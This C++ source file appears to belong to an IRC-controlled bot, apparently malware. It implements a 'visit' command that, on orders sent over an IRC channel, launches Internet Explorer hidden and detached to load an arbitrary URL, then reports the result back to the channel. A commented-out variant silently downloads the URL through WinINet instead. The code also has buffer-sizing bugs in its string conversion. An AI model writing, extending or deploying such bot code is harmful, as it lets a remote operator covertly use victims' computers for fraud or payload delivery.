#include "../IRC.hpp"

/*int IRC::CMDVisit( string address, bool visible ) {
	if (visible)
		api->ShellExecuteA(NULL, "open", address.c_str(), NULL, NULL, SW_SHOW);
	else {
		HINTERNET hInet;
		if ((hInet = api->InternetOpen(api->GetUserAgent().c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL)) == NULL)
			return(IRCSend(IRC_MSG, servers[currserver].channel, MSG_VISIT_FAILED));

		HINTERNET hRet;
		hRet = api->InternetOpenUrl(hInet, address.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
		if (!hRet)
			return(IRCSend(IRC_MSG, servers[currserver].channel, MSG_VISIT_FAILED));
		char szBuffer[1025] = {0};
		DWORD dwBytesRead = 0, dwBytesToRead = 1024, dwFileBytesRead = 0, dwTotalBytes = 0;
		do { 
			ZeroMemory(szBuffer, sizeof(szBuffer));
			api->InternetReadFile(hRet, (void*)szBuffer, dwBytesToRead, &dwBytesRead);
			dwTotalBytes += dwBytesRead;
		} while(dwBytesRead > 0);
		api->InternetCloseHandle(hInet);
		api->InternetCloseHandle(hRet);
	}
	return(IRCSend(IRC_MSG, servers[currserver].channel, MSG_VISIT_SUCCESS));
}*/

int IRC::CMDVisit( string address, bool visible) {
		PROCESS_INFORMATION pinfo;
		STARTUPINFOW sinfo;
		ZeroMemory(&pinfo, sizeof(pinfo));
		ZeroMemory(&sinfo, sizeof(sinfo));
		sinfo.lpTitle     = 0;
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		char iexplore[MAX_PATH];
		char url[512];
		ExpandEnvironmentStrings("%programfiles%\\Internet Explorer\\iexplore.exe", iexplore, MAX_PATH);
		sprintf(url, "explorer.exe \"%s\"", address.c_str());
		if (visible)
			sinfo.wShowWindow = SW_SHOW;
		else
			sinfo.wShowWindow = SW_HIDE;
			
		wchar_t* pwszParam = (wchar_t*)malloc(lstrlen(url) * sizeof(wchar_t));
		wchar_t* iexploret = (wchar_t*)malloc(lstrlen(iexplore) * sizeof(wchar_t));
		
		MultiByteToWideChar(CP_ACP, 0, url, lstrlen(url), pwszParam, lstrlen(url));
		MultiByteToWideChar(CP_ACP, 0, iexplore, lstrlen(iexplore), iexploret, lstrlen(iexplore));
		
		if (CreateProcessW(iexploret, pwszParam, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL , &sinfo, &pinfo))
			IRCSend(IRC_MSG, servers[currserver].channel, MSG_VISIT_SUCCESS);
		else
			IRCSend(IRC_MSG, servers[currserver].channel, MSG_VISIT_FAILED);
		
		free(pwszParam);
		free(iexploret);
		return 1;
}